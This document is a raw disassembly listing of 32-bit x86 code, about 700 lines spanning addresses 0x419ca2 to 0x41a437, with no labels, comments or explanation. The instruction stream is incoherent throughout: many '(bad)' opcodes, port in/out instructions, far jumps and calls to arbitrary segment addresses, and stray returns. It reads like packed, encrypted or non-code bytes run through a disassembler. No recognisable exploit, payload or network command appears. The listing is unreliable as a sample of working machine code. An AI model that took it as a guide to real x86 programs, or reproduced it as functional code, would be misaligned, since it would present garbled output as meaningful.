  419ca2:	(bad)  
  419ca3:	popa   
  419ca4:	sub    ebp,DWORD PTR [ecx-0x158cebab]
  419caa:	ja     0x419ce0
  419cac:	ja     0x419cde
  419cae:	es pusha 
  419cb0:	or     DWORD PTR [ecx+0x3e],0x28
  419cb4:	mov    WORD PTR [esi-0x39],ds
  419cb7:	or     DWORD PTR [edx-0x2b],0x3a
  419cbb:	adc    BYTE PTR [edi+0x115f7fac],ah
  419cc1:	xchg   ebp,eax
  419cc2:	rcr    bh,1
  419cc4:	(bad)  
  419cc5:	jae    0x419c4c
  419cc7:	data16 jno 0x419c61
  419cca:	add    BYTE PTR [edx+esi*2-0x52],bl
  419cce:	not    DWORD PTR [ebx]
  419cd0:	pop    ebp
  419cd1:	das    
  419cd2:	nop
  419cd3:	mov    edx,0x761d9e36
  419cd8:	mov    DWORD PTR [ebp+0x14],edx
  419cdb:	(bad)  
  419cdc:	jmp    0x419cd1
  419cde:	test   BYTE PTR ds:0xd67f44cd,bh
  419ce4:	test   BYTE PTR [eax],bl
  419ce6:	mov    ebp,DWORD PTR [ebp+0x4669eec]
  419cec:	mov    ah,al
  419cee:	sub    eax,0xc7b4baac
  419cf3:	sub    BYTE PTR [ebp+0x77],dh
  419cf6:	fst    QWORD PTR [edi-0x195149b8]
  419cfc:	ja     0x419d53
  419cfe:	fbld   TBYTE PTR [ecx+0x44fce255]
  419d04:	pop    es
  419d05:	cmp    BYTE PTR [esi],dh
  419d07:	mov    dl,0x4e
  419d09:	jae    0x419d73
  419d0b:	or     al,0x6
  419d0d:	fs inc eax
  419d0f:	fmul   st,st(4)
  419d11:	fmul   QWORD PTR [ecx+ebp*8+0x1b]
  419d15:	fdivr  QWORD PTR [ebp+0x7f]
  419d18:	ror    DWORD PTR [eax-0x13959aa4],0xa4
  419d1f:	test   DWORD PTR [edi-0x42bf0cdf],ebx
  419d25:	lods   eax,DWORD PTR ds:[esi]
  419d26:	mov    ebp,ecx
  419d28:	xor    al,0x17
  419d2a:	xchg   DWORD PTR [esi-0x74],esi
  419d2d:	mov    cl,0x9e
  419d2f:	dec    eax
  419d30:	xor    bh,BYTE PTR [eax+0x5fcc44fd]
  419d36:	jno    0x419d40
  419d38:	push   edx
  419d39:	ret    0x2424
  419d3c:	sahf   
  419d3d:	data16 daa 
  419d3f:	(bad)  
  419d41:	xchg   ebx,eax
  419d42:	div    BYTE PTR [esi-0x1b]
  419d45:	inc    esp
  419d46:	cdq    
  419d47:	int    0xd7
  419d49:	add    DWORD PTR [edx-0x3be5281d],0xce92bf7c
  419d53:	xchg   ebx,eax
  419d54:	pop    ecx
  419d55:	xor    esp,DWORD PTR [di+0x5330]
  419d5a:	pop    edi
  419d5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d5c:	popa   
  419d5d:	add    BYTE PTR [eax+0x21],bl
  419d60:	jae    0x419d44
  419d62:	pop    edi
  419d63:	and    ah,bh
  419d65:	rol    DWORD PTR [ebx],0x3e
  419d68:	mov    edx,0x7cc8fbeb
  419d6d:	bound  esp,QWORD PTR [edx-0x7ac5a4a5]
  419d73:	out    0x92,al
  419d75:	push   ebx
  419d76:	inc    esp
  419d77:	rol    DWORD PTR [ebx+edx*2],1
  419d7a:	xchg   ebx,eax
  419d7b:	scas   eax,DWORD PTR es:[edi]
  419d7c:	push   edx
  419d7d:	mov    DWORD PTR [edi+0x395290e1],eax
  419d83:	and    al,0xf8
  419d85:	cld    
  419d86:	adc    al,0x3f
  419d88:	adc    eax,DWORD PTR [edx+0x5a]
  419d8b:	mov    al,ds:0x5f78e0c5
  419d90:	add    al,0xac
  419d92:	imul   esi,DWORD PTR ds:0x4c91c97f,0xc6d24706
  419d9c:	popf   
  419d9d:	jns    0x419ddc
  419d9f:	leave  
  419da0:	mov    esp,eax
  419da2:	inc    esi
  419da3:	adc    edi,esp
  419da5:	das    
  419da6:	dec    eax
  419da7:	pop    esp
  419da8:	das    
  419da9:	fsubr  QWORD PTR [eax+edi*8]
  419dac:	in     eax,dx
  419dad:	fwait
  419dae:	jns    0x419d56
  419db0:	or     BYTE PTR [ebx+0x3640c058],bl
  419db6:	sub    dh,ah
  419db8:	xor    al,0x1a
  419dba:	in     al,dx
  419dbb:	ficom  WORD PTR [eax+0x53]
  419dbe:	nop
  419dbf:	rcl    BYTE PTR [edx+ecx*2],1
  419dc2:	mov    ds:0x66271949,eax
  419dc7:	ja     0x419d5f
  419dc9:	sbb    DWORD PTR [esi+0x3c],edx
  419dcc:	imul   eax,DWORD PTR [ebx+0x4d44690f],0x59
  419dd3:	std    
  419dd4:	mov    ds:0x705756f6,eax
  419dd9:	mov    ds:0x9899810e,al
  419dde:	xchg   esp,eax
  419ddf:	xor    edi,ecx
  419de1:	jmp    0x35d8:0x599cebb8
  419de8:	pop    esp
  419de9:	in     eax,dx
  419dea:	or     DWORD PTR [eax],esi
  419dec:	mov    ebp,0x40d8b3a1
  419df1:	dec    eax
  419df2:	add    al,0x9a
  419df5:	sbb    BYTE PTR [ecx+ebp*2-0x23],bl
  419df9:	(bad)  [eax-0x4e]
  419dfc:	xor    BYTE PTR [ebx+0x61],dl
  419dff:	add    al,0x5d
  419e01:	loopne 0x419dfb
  419e03:	xchg   dh,bh
  419e05:	retf   
  419e06:	sahf   
  419e07:	sbb    eax,edi
  419e09:	dec    edx
  419e0a:	pop    ebp
  419e0b:	fild   WORD PTR [ecx]
  419e0d:	jl     0x419e26
  419e0f:	jo     0x419da1
  419e11:	xchg   ebx,eax
  419e12:	sbb    al,0x84
  419e14:	xlat   BYTE PTR es:[ebx]
  419e16:	inc    ebx
  419e17:	mov    ebp,0xc16f9f4e
  419e1c:	ins    DWORD PTR es:[edi],dx
  419e1d:	add    DWORD PTR [ebx+0x3f],eax
  419e20:	pop    es
  419e21:	enter  0x4661,0x26
  419e25:	stos   BYTE PTR es:[edi],al
  419e26:	xor    edi,ecx
  419e28:	mov    eax,DWORD PTR [eax-0x2f]
  419e2b:	rcl    BYTE PTR [eax+esi*4],0xf
  419e2f:	mov    ebp,0x32f16b12
  419e34:	mov    eax,0x16e8bfc9
  419e39:	xchg   ebp,esi
  419e3b:	fwait
  419e3c:	adc    esi,0x7d
  419e3f:	sbb    ebx,DWORD PTR [eax+0x4f]
  419e42:	mov    ?,WORD PTR [esi]
  419e44:	and    eax,0x224e9afc
  419e49:	(bad)  
  419e4b:	xchg   esp,eax
  419e4c:	xor    cl,al
  419e4e:	test   eax,0x242d9da5
  419e53:	jo     0x419e0f
  419e55:	push   ecx
  419e56:	es xchg ebx,eax
  419e58:	ja     0x419dfe
  419e5a:	and    DWORD PTR [edi+0x5b],edx
  419e5d:	sbb    eax,0xc6c17fb3
  419e62:	push   edx
  419e63:	fld    QWORD PTR [edi]
  419e65:	mov    edx,0xb928224e
  419e6a:	pop    es
  419e6b:	and    BYTE PTR [ebx-0x2d38109],bh
  419e71:	mov    ds:0x2155179a,al
  419e76:	add    ebp,esp
  419e78:	mov    eax,0xb7fc97cd
  419e7d:	daa    
  419e7e:	repnz sbb edi,esi
  419e81:	loopne 0x419eff
  419e83:	jmp    0xd868:0x904b0748
  419e8a:	js     0x419e18
  419e8c:	mov    dl,0xde
  419e8e:	(bad)  [ebx-0x65]
  419e91:	jae    0x419e59
  419e93:	cmp    al,0xc2
  419e95:	mov    ebx,DWORD PTR [edx]
  419e97:	int3   
  419e98:	cli    
  419e99:	out    0x5,eax
  419e9b:	aam    0xaf
  419e9d:	mov    ds:0x18aee05b,al
  419ea2:	adc    eax,0x4d3826ca
  419ea7:	jno    0x419e83
  419ea9:	out    dx,al
  419eaa:	jne    0x419eb3
  419eac:	or     eax,0xc7e1eab5
  419eb1:	ja     0x419e50
  419eb3:	add    edi,DWORD PTR [edi+0x4d8c4278]
  419eb9:	sbb    al,0x7
  419ebb:	jo     0x419ef9
  419ebd:	mov    bh,0x23
  419ebf:	push   eax
  419ec0:	jns    0x419ecf
  419ec2:	push   0x71
  419ec4:	xor    BYTE PTR [edx-0x7d020eec],ah
  419eca:	fwait
  419ecb:	jno    0x419ebc
  419ecd:	add    ch,BYTE PTR [edi-0x2a]
  419ed0:	xchg   edx,eax
  419ed1:	xchg   edi,eax
  419ed2:	add    eax,0xa5d6b221
  419ed7:	stc    
  419ed8:	imul   ecx,DWORD PTR [eax],0x18e73283
  419ede:	xchg   esp,eax
  419edf:	aam    0xb9
  419ee1:	mov    ch,0x72
  419ee3:	sbb    BYTE PTR [bp+si-0x4456],bl
  419ee8:	cmp    al,0xad
  419eea:	pushf  
  419eeb:	sbb    eax,0x52c9a062
  419ef0:	test   eax,0xad458119
  419ef5:	dec    BYTE PTR [eax-0x5f]
  419ef8:	pop    edx
  419ef9:	or     BYTE PTR [esi],ah
  419efb:	push   edx
  419efc:	push   eax
  419efd:	cwde   
  419efe:	xchg   BYTE PTR [edx+0x67],dh
  419f01:	sbb    dl,BYTE PTR [eax]
  419f03:	pop    esp
  419f04:	xor    ebx,DWORD PTR [edi-0x360e778]
  419f0a:	test   eax,edi
  419f0c:	call   0xdd99:0x1a40644e
  419f13:	inc    ebx
  419f14:	jge    0x419f41
  419f16:	js     0x419f05
  419f18:	sar    BYTE PTR [edi],cl
  419f1a:	aad    0x45
  419f1c:	push   eax
  419f1d:	adc    ebp,DWORD PTR [ebx]
  419f1f:	aam    0x77
  419f21:	nop
  419f22:	mov    esp,0x14e5533e
  419f27:	mov    dl,0xc4
  419f29:	dec    ebx
  419f2a:	mov    cl,0xbf
  419f2c:	enter  0xf248,0x32
  419f30:	in     eax,0x98
  419f32:	xchg   ebx,eax
  419f33:	nop
  419f34:	push   esp
  419f35:	and    ebp,edi
  419f37:	out    0xa3,eax
  419f39:	out    0xa9,al
  419f3b:	jo     0x419f08
  419f3d:	add    eax,DWORD PTR [ebx+esi*4]
  419f40:	sbb    DWORD PTR [ecx],ebp
  419f42:	mov    ebx,0x331802a8
  419f47:	scas   al,BYTE PTR es:[edi]
  419f48:	cmp    bl,BYTE PTR [ecx]
  419f4a:	xor    eax,0x186cc24e
  419f4f:	mov    ds:0x56946c9f,eax
  419f54:	push   cs
  419f55:	jg     0x419ef0
  419f57:	mov    al,ds:0x3439128b
  419f5c:	scas   al,BYTE PTR es:[edi]
  419f5d:	pusha  
  419f5e:	mov    ds:0xbd06b54d,al
  419f63:	vpsubw xmm5,xmm2,XMMWORD PTR [eax+0x24]
  419f68:	sbb    DWORD PTR [esi+0xc],esi
  419f6b:	mov    edi,0xb2981200
  419f70:	stc    
  419f71:	lea    ebx,[ecx]
  419f73:	iret   
  419f74:	imul   eax,DWORD PTR [edi+0x2400da70],0xaa63f8c1
  419f7e:	(bad)  
  419f7f:	popa   
  419f80:	pop    esi
  419f81:	pop    edx
  419f82:	xlat   BYTE PTR ds:[ebx]
  419f83:	bound  ebx,QWORD PTR [ebp-0xe]
  419f86:	test   eax,esp
  419f88:	pushf  
  419f89:	leave  
  419f8a:	jno    0x419fd7
  419f8c:	scas   eax,DWORD PTR es:[edi]
  419f8d:	mov    esp,0xe13ad47c
  419f92:	sti    
  419f93:	loope  0x419fe5
  419f95:	cmp    eax,0xf3008981
  419f9a:	loope  0x419ff9
  419f9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f9d:	inc    BYTE PTR [ecx]
  419f9f:	mov    esp,0xe47305a1
  419fa4:	iret   
  419fa5:	retf   
  419fa6:	push   cs
  419fa7:	sbb    DWORD PTR [ecx],ebx
  419fa9:	sbb    DWORD PTR [edx-0x39],eax
  419fac:	push   ebp
  419fad:	enter  0xb1b1,0xc9
  419fb1:	pop    esi
  419fb2:	dec    ebp
  419fb3:	or     al,0x4b
  419fb5:	retf   0xf244
  419fb8:	add    bh,bl
  419fba:	ins    BYTE PTR es:[edi],dx
  419fbb:	scas   eax,DWORD PTR es:[edi]
  419fbc:	and    ah,al
  419fbe:	jbe    0x419f7c
  419fc0:	jnp    0x41a015
  419fc2:	shl    BYTE PTR [ebx+0x38],1
  419fc5:	daa    
  419fc6:	mov    ebp,0x992f3411
  419fcb:	cmp    esi,eax
  419fcd:	es iret 
  419fcf:	lods   al,BYTE PTR ds:[esi]
  419fd0:	(bad)  
  419fd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419fd3:	lahf   
  419fd4:	sub    dl,al
  419fd6:	adc    ecx,eax
  419fd8:	and    cl,ah
  419fda:	imul   esi,DWORD PTR [ebp-0xa],0xa463d3f4
  419fe1:	adc    eax,0x2266355
  419fe6:	adc    ah,BYTE PTR [edx-0x1467aaed]
  419fec:	dec    edx
  419fed:	xchg   edx,eax
  419fee:	lods   ax,WORD PTR ds:[esi]
  419ff0:	in     al,dx
  419ff1:	out    0x17,al
  419ff3:	pop    ebx
  419ff4:	pop    edi
  419ff5:	cmp    ebp,DWORD PTR [esp+esi*2-0x7]
  419ff9:	in     eax,0x5b
  419ffb:	call   DWORD PTR [ebp+0x14]
  419ffe:	scas   eax,DWORD PTR es:[edi]
  419fff:	mov    ah,0xc1
  41a001:	and    al,0xca
  41a003:	iret   
  41a004:	jb     0x419fe5
  41a006:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a007:	idiv   DWORD PTR [edi]
  41a009:	or     al,0xb7
  41a00b:	cld    
  41a00c:	in     al,0x6e
  41a00e:	fsub   QWORD PTR [ecx+0x30]
  41a011:	pop    ebx
  41a012:	sbb    cl,BYTE PTR [eax-0xc]
  41a015:	(bad)  
  41a016:	stos   DWORD PTR es:[edi],eax
  41a017:	imul   ebp,ecx,0x3310a6b6
  41a01d:	jo     0x41a07e
  41a01f:	jae    0x41a01a
  41a021:	pop    ds
  41a022:	retf   
  41a023:	retf   
  41a024:	add    BYTE PTR [eax],0xb9
  41a027:	push   edx
  41a028:	jg     0x419fb7
  41a02a:	mov    ah,0xb2
  41a02c:	lock cmp DWORD PTR [eax+0x67351844],ecx
  41a033:	pop    ecx
  41a034:	stc    
  41a035:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a036:	pop    ebx
  41a037:	pop    ss
  41a038:	mov    al,ds:0x610047b8
  41a03d:	cmc    
  41a03e:	adc    eax,0x345e845b
  41a043:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a044:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a045:	into   
  41a046:	xlat   BYTE PTR ds:[ebx]
  41a047:	push   ss
  41a048:	xchg   ebx,eax
  41a049:	aas    
  41a04a:	std    
  41a04b:	mov    edi,ebp
  41a04d:	sbb    edx,DWORD PTR [esi+0x33]
  41a050:	arpl   WORD PTR [ecx-0x3a],sp
  41a053:	scas   eax,DWORD PTR es:[edi]
  41a054:	into   
  41a055:	pusha  
  41a056:	mov    ebp,0xdc02f45c
  41a05b:	or     BYTE PTR [ebx+0x21],0xe8
  41a05f:	loopne 0x41a009
  41a061:	sbb    dh,dh
  41a063:	rcl    BYTE PTR [esi],0x65
  41a066:	ds jle 0x419ff6
  41a069:	sbb    DWORD PTR [esi],ecx
  41a06b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a06c:	jge    0x41a070
  41a06e:	sub    al,0xfd
  41a070:	ss popa 
  41a072:	pop    edx
  41a073:	fyl2x  
  41a075:	dec    edx
  41a076:	sahf   
  41a077:	xor    esp,DWORD PTR [ecx]
  41a079:	jne    0x41a01b
  41a07b:	and    eax,0xa2675094
  41a080:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a082:	outs   dx,DWORD PTR ds:[esi]
  41a083:	jno    0x41a048
  41a085:	mov    bh,0x61
  41a087:	dec    edi
  41a088:	jle    0x41a02f
  41a08a:	push   esi
  41a08c:	xor    al,0x85
  41a08e:	or     ecx,DWORD PTR cs:0x3f9ed2c9
  41a095:	ins    DWORD PTR es:[edi],dx
  41a096:	dec    ecx
  41a097:	pop    eax
  41a098:	outs   dx,BYTE PTR ds:[esi]
  41a099:	iret   
  41a09a:	ja     0x41a088
  41a09c:	inc    edx
  41a09d:	shl    BYTE PTR [ebp-0x3e56e6b5],0xe8
  41a0a4:	dec    ebp
  41a0a5:	(bad)  
  41a0a6:	fstp   DWORD PTR [ebx+ecx*1]
  41a0a9:	ret    
  41a0aa:	push   es
  41a0ab:	sub    al,0x86
  41a0ad:	jmp    0x398b86b2
  41a0b2:	dec    edx
  41a0b3:	push   ebp
  41a0b4:	imul   eax,DWORD PTR [edi],0xe8a161d8
  41a0ba:	in     al,dx
  41a0bb:	pop    ecx
  41a0bc:	pop    ecx
  41a0bd:	shl    edx,1
  41a0bf:	aas    
  41a0c0:	xor    edi,DWORD PTR [esp+ebx*2]
  41a0c3:	adc    cl,cl
  41a0c5:	jmp    0x41a048
  41a0c7:	cmp    bh,0x50
  41a0ca:	dec    edi
  41a0cb:	in     eax,0xc7
  41a0cd:	xor    DWORD PTR [eax+ecx*1],esi
  41a0d0:	sar    DWORD PTR ds:0x9a28b061,cl
  41a0d6:	sub    al,0xa4
  41a0d8:	pop    ds
  41a0d9:	fmul   st(0),st
  41a0db:	jo     0x41a0cc
  41a0dd:	mov    dh,0xcf
  41a0df:	fisubr WORD PTR [eax+eax*1]
  41a0e2:	outs   dx,DWORD PTR ds:[esi]
  41a0e3:	cmp    eax,ecx
  41a0e5:	rcl    DWORD PTR [eax+0x327564ed],0x66
  41a0ec:	bound  ebp,QWORD PTR [ebx-0x55]
  41a0ef:	mov    dh,0xb1
  41a0f1:	test   eax,0x248fea
  41a0f6:	mov    al,0xe4
  41a0f8:	sahf   
  41a0f9:	popa   
  41a0fa:	xor    eax,0x38d3a2b8
  41a0ff:	popf   
  41a100:	popa   
  41a101:	jno    0x41a092
  41a103:	sub    DWORD PTR [esi-0x1a],0x23
  41a107:	es add al,0x8e
  41a10a:	or     al,0x63
  41a10c:	inc    eax
  41a10d:	dec    edi
  41a10e:	jmp    0x2c2af49c
  41a113:	shl    ebx,1
  41a115:	adc    BYTE PTR [edx+0x41872230],bh
  41a11b:	sub    eax,0x921a946
  41a120:	imul   edx,DWORD PTR [edx-0x6f488d59],0xc9b46a02
  41a12a:	lods   eax,DWORD PTR ds:[esi]
  41a12b:	(bad)  
  41a12c:	xor    eax,0xd2e311ab
  41a131:	cmp    DWORD PTR [ecx-0x4c2d433e],edx
  41a137:	cmp    ah,BYTE PTR [ecx+esi*4-0x105d333]
  41a13e:	add    DWORD PTR gs:[eax-0x2579b1aa],eax
  41a145:	pop    ebp
  41a146:	push   es
  41a147:	cmc    
  41a148:	(bad)  
  41a149:	cld    
  41a14a:	pop    ebp
  41a14b:	fcom   DWORD PTR [eax+edx*8]
  41a14e:	mov    cl,0xea
  41a150:	je     0x41a129
  41a152:	adc    ebp,ebx
  41a154:	mov    dh,0x2e
  41a156:	stc    
  41a157:	and    eax,DWORD PTR [eax]
  41a159:	fcom   st(6)
  41a15b:	push   edx
  41a15c:	fistp  DWORD PTR [eax-0x3f]
  41a15f:	mov    bl,0xc0
  41a161:	stos   DWORD PTR es:[edi],eax
  41a162:	loopne 0x41a1d2
  41a164:	ffree  st(0)
  41a166:	daa    
  41a167:	clc    
  41a168:	(bad)  [eax]
  41a16a:	dec    esi
  41a16b:	std    
  41a16c:	jge    0x41a16b
  41a16e:	pop    ebp
  41a16f:	rcr    DWORD PTR [ebp+0xd],0xa1
  41a173:	mov    bh,0xa
  41a175:	repz mov ds:0x91d4f8d1,al
  41a17b:	add    ebx,esi
  41a17d:	add    BYTE PTR [ecx+0x64f5b2d1],cl
  41a183:	push   0xc850692e
  41a188:	sub    ah,BYTE PTR [eax+0x110cc671]
  41a18e:	cmp    dh,BYTE PTR [ebp+ebp*1-0x67b94dbf]
  41a195:	out    0x3,eax
  41a197:	popf   
  41a198:	je     0x41a1d0
  41a19a:	test   DWORD PTR [ecx-0x65],ebp
  41a19d:	dec    esi
  41a19e:	and    DWORD PTR [eax+0x3ecf6de3],0x572dcf36
  41a1a8:	or     bl,BYTE PTR [edx]
  41a1aa:	xchg   edx,eax
  41a1ab:	and    ecx,DWORD PTR ds:0x43ce0503
  41a1b1:	adc    esi,DWORD PTR ds:0xed5f795b
  41a1b7:	cmp    BYTE PTR [ecx-0x5a],0x32
  41a1bb:	rcr    BYTE PTR [eax+eax*8+0x3f0af092],0xd2
  41a1c3:	adc    bh,0x13
  41a1c6:	inc    edx
  41a1c7:	inc    esp
  41a1c8:	test   cl,bh
  41a1ca:	mov    bl,0x1c
  41a1cc:	js     0x41a1a8
  41a1ce:	inc    DWORD PTR [ecx]
  41a1d0:	xor    DWORD PTR [edi+0x8e98138],0xb37645f1
  41a1da:	inc    edi
  41a1db:	adc    bl,BYTE PTR [ecx-0x36]
  41a1de:	iret   
  41a1df:	jae    0x41a1f8
  41a1e1:	pusha  
  41a1e2:	mov    ebp,0xc92ca4b8
  41a1e7:	xchg   ebx,eax
  41a1e8:	xlat   BYTE PTR ds:[ebx]
  41a1e9:	and    al,BYTE PTR [eax+0x7038c4fb]
  41a1ef:	test   DWORD PTR [ecx+0x6f05125e],ebp
  41a1f5:	je     0x41a1f4
  41a1f7:	or     eax,0x42e06ae8
  41a1fc:	daa    
  41a1fd:	into   
  41a1fe:	jle    0x41a1c8
  41a200:	inc    ebx
  41a201:	jns    0x41a1f4
  41a203:	add    DWORD PTR [ecx],esi
  41a205:	jno    0x41a20c
  41a207:	loopne 0x41a24b
  41a209:	lock test DWORD PTR [ebx],ebp
  41a20c:	loope  0x41a194
  41a20e:	adc    eax,0x1b125f26
  41a213:	jae    0x41a210
  41a215:	xchg   ebp,eax
  41a216:	out    dx,eax
  41a217:	xchg   ebp,eax
  41a218:	sar    bl,1
  41a21a:	and    dh,cl
  41a21c:	add    al,0xc8
  41a21e:	popf   
  41a21f:	jmp    0x41a1e5
  41a221:	imul   esi,DWORD PTR [ebx],0xffffffbb
  41a224:	mov    al,0xdf
  41a226:	fisubr DWORD PTR [ebx-0x1cf6eb7e]
  41a22c:	shl    DWORD PTR [esi+ebp*8],1
  41a22f:	movntps XMMWORD PTR [ebx],xmm7
  41a232:	pushf  
  41a233:	retf   
  41a234:	out    dx,al
  41a235:	cmp    ecx,DWORD PTR [ebp-0x59d99731]
  41a23b:	mov    esi,ebx
  41a23d:	aad    0x98
  41a23f:	pop    eax
  41a240:	nop
  41a241:	fadd   QWORD PTR [ebx]
  41a243:	mov    eax,ds:0x8890d2d0
  41a248:	mov    edx,0xb60f44c1
  41a24d:	shl    BYTE PTR [ebp-0x22],1
  41a250:	or     DWORD PTR [ebp+0x10dc245e],0x816f63d5
  41a25a:	cmp    eax,eax
  41a25c:	(bad)  
  41a25d:	pop    esi
  41a25e:	stos   BYTE PTR es:[edi],al
  41a25f:	(bad)  
  41a260:	ins    DWORD PTR es:[edi],dx
  41a261:	xchg   edi,eax
  41a262:	push   0x69
  41a264:	aas    
  41a265:	mov    ah,0xa7
  41a267:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a268:	add    al,0x15
  41a26a:	pop    ss
  41a26b:	repz pushf 
  41a26d:	fcmove st,st(0)
  41a26f:	je     0x41a20f
  41a271:	jmp    0x5298e972
  41a276:	fdiv   QWORD PTR [edx]
  41a278:	xchg   edi,eax
  41a279:	(bad)  
  41a27a:	xchg   ebx,eax
  41a27b:	call   0x6770c338
  41a280:	aam    0x2e
  41a282:	jae    0x41a22e
  41a284:	add    al,0xf0
  41a286:	(bad)  
  41a287:	push   ss
  41a288:	dec    esi
  41a289:	mov    BYTE PTR [esi-0x18],al
  41a28c:	mov    eax,DWORD PTR [esi]
  41a28e:	mov    bl,BYTE PTR [esp+edi*8+0x1116eb46]
  41a295:	or     al,0x7d
  41a297:	(bad)  
  41a298:	in     al,0x23
  41a29a:	sub    eax,0x27d451bb
  41a29f:	jl     0x41a24b
  41a2a1:	xor    ch,al
  41a2a3:	and    al,0x5b
  41a2a5:	or     eax,0xfeeac8b
  41a2aa:	pop    ss
  41a2ab:	push   0x7c604b70
  41a2b0:	jne    0x41a250
  41a2b2:	cdq    
  41a2b3:	cmp    eax,DWORD PTR [edx]
  41a2b5:	into   
  41a2b6:	(bad)  
  41a2b7:	mov    ecx,0x2a757c8f
  41a2bc:	xchg   edi,eax
  41a2bd:	lea    ebp,[edi]
  41a2bf:	sbb    edi,DWORD PTR [edx-0x7b]
  41a2c2:	fsubr  st,st(3)
  41a2c4:	sub    dh,cl
  41a2c6:	or     dl,BYTE PTR [esi]
  41a2c8:	mov    ebp,0x1d2bd08e
  41a2cd:	call   0x47ca:0x21fe60d3
  41a2d4:	mov    WORD PTR [ecx+0x4f],gs
  41a2d7:	arpl   WORD PTR [edx+0x64a4338d],di
  41a2dd:	bound  ecx,QWORD PTR [eax-0x394519aa]
  41a2e3:	dec    eax
  41a2e4:	mov    WORD PTR [ebp+esi*1-0x4812b4aa],ss
  41a2eb:	jae    0x41a2cc
  41a2ed:	stos   DWORD PTR es:[edi],eax
  41a2ee:	rol    BYTE PTR [ebx+eax*4+0x7c1d204e],cl
  41a2f5:	dec    edi
  41a2f6:	rol    cl,1
  41a2f8:	mov    bh,0xb6
  41a2fa:	dec    esp
  41a2fb:	mov    esp,0x808d8f1
  41a300:	ins    BYTE PTR es:[edi],dx
  41a301:	xchg   edi,eax
  41a302:	sub    eax,0x87afa755
  41a307:	cs call 0x462a:0x2330b5e3
  41a30f:	nop
  41a310:	cmp    BYTE PTR [ecx-0x39],cl
  41a313:	pop    es
  41a314:	and    DWORD PTR ds:0xd978ff33,edx
  41a31a:	add    ecx,DWORD PTR [eax]
  41a31c:	push   ecx
  41a31d:	fidiv  WORD PTR [edx-0x57]
  41a320:	leave  
  41a321:	mov    BYTE PTR [eax+0x42159c30],bl
  41a327:	std    
  41a328:	shl    DWORD PTR [eax+0x1f33dfa7],cl
  41a32e:	pop    esi
  41a32f:	pop    ss
  41a330:	ds imul ebp,esi,0x9a8246af
  41a337:	(bad)  
  41a338:	mov    esp,0x587e6b1b
  41a33d:	mul    DWORD PTR [edx-0xd58dea3]
  41a343:	sbb    DWORD PTR [ecx+0x7e],0xffffffa4
  41a347:	adc    bl,BYTE PTR [edx]
  41a349:	es cmp eax,0x4d4e6879
  41a34f:	xchg   DWORD PTR [ebx+edx*4-0x26b198d0],ecx
  41a356:	sbb    esp,DWORD PTR [esi-0x7f]
  41a359:	sbb    BYTE PTR [ebp-0x7d],dl
  41a35c:	mov    edx,0x236e6e7d
  41a361:	or     dh,dh
  41a363:	test   cl,bh
  41a365:	out    dx,eax
  41a366:	daa    
  41a367:	mov    gs,edi
  41a369:	dec    edx
  41a36a:	sbb    DWORD PTR [ecx-0x1a096358],edi
  41a370:	in     eax,0x99
  41a372:	jp     0x41a353
  41a374:	pop    edx
  41a375:	sub    DWORD PTR [ebp+0x75791f15],ebx
  41a37b:	inc    edi
  41a37c:	sub    al,0x6b
  41a37e:	bound  edi,QWORD PTR [esi]
  41a380:	add    DWORD PTR [esi],edx
  41a382:	mov    eax,0x4e20055d
  41a387:	icebp  
  41a388:	enter  0xe0b8,0xb5
  41a38c:	aad    0xfb
  41a38e:	iret   
  41a38f:	pop    edx
  41a390:	and    DWORD PTR [esi],0xffffff87
  41a393:	pop    edx
  41a394:	mov    ch,0x8c
  41a396:	arpl   WORD PTR [eax-0x6e31f73a],si
  41a39c:	push   esp
  41a39d:	shl    BYTE PTR [esi],1
  41a39f:	pop    eax
  41a3a0:	ja     0x41a3da
  41a3a2:	aad    0x72
  41a3a4:	je     0x41a372
  41a3a6:	pop    ecx
  41a3a7:	push   ecx
  41a3a8:	add    ebx,DWORD PTR ds:0xef8ca0be
  41a3ae:	std    
  41a3af:	mov    ebp,0xf03cf429
  41a3b4:	mov    al,0x79
  41a3b6:	dec    esi
  41a3b7:	sar    ah,0x7b
  41a3ba:	push   ds
  41a3bb:	rcl    BYTE PTR [ecx+0xfa31caf],1
  41a3c1:	sbb    DWORD PTR [ebx+0x7b],0xffffffc3
  41a3c5:	inc    esi
  41a3c6:	fld    TBYTE PTR [edx+0x14]
  41a3c9:	and    eax,0xe89740c7
  41a3ce:	add    al,0xd1
  41a3d0:	sbb    DWORD PTR [eax+0x1e],edx
  41a3d3:	loop   0x41a3c9
  41a3d5:	mov    ah,0x1
  41a3d7:	pop    eax
  41a3d8:	bound  edx,QWORD PTR [edi-0x14]
  41a3db:	fild   DWORD PTR [ecx+ecx*8-0x1c]
  41a3df:	add    ah,BYTE PTR [edx]
  41a3e1:	push   0x77
  41a3e3:	jmp    0x1d5:0xd0521254
  41a3ea:	and    dh,bh
  41a3ec:	ja     0x41a3f5
  41a3ee:	jnp    0x41a38d
  41a3f0:	cmp    al,0x6f
  41a3f2:	adc    ah,ah
  41a3f4:	(bad)  
  41a3f5:	adc    BYTE PTR [ebx-0x5],al
  41a3f8:	das    
  41a3f9:	psrad  mm3,QWORD PTR ds:0xe9114121
  41a400:	out    0x79,eax
  41a402:	imul   ecx,ebp,0x70
  41a405:	dec    ebx
  41a406:	xlat   BYTE PTR ds:[ebx]
  41a407:	ds (bad) 
  41a409:	or     eax,0xd1152ff1
  41a40e:	sub    DWORD PTR [edi-0x3cde7459],ebp
  41a414:	sbb    BYTE PTR [edi+0x27],bh
  41a417:	rcl    DWORD PTR [ebx-0x60],1
  41a41a:	cmp    BYTE PTR [ebx],bl
  41a41c:	outs   dx,BYTE PTR ds:[esi]
  41a41d:	inc    ebp
  41a41e:	jl     0x41a476
  41a420:	adc    bl,BYTE PTR [ebx-0x46b77536]
  41a426:	shr    DWORD PTR [ecx-0x3e],0x89
  41a42a:	in     eax,0x93
  41a42c:	idiv   BYTE PTR [ebx+0x2173eebe]
  41a432:	mov    eax,0xedd19e26
  41a437:	rcr    DWORD PTR [edx+0x70],0x1
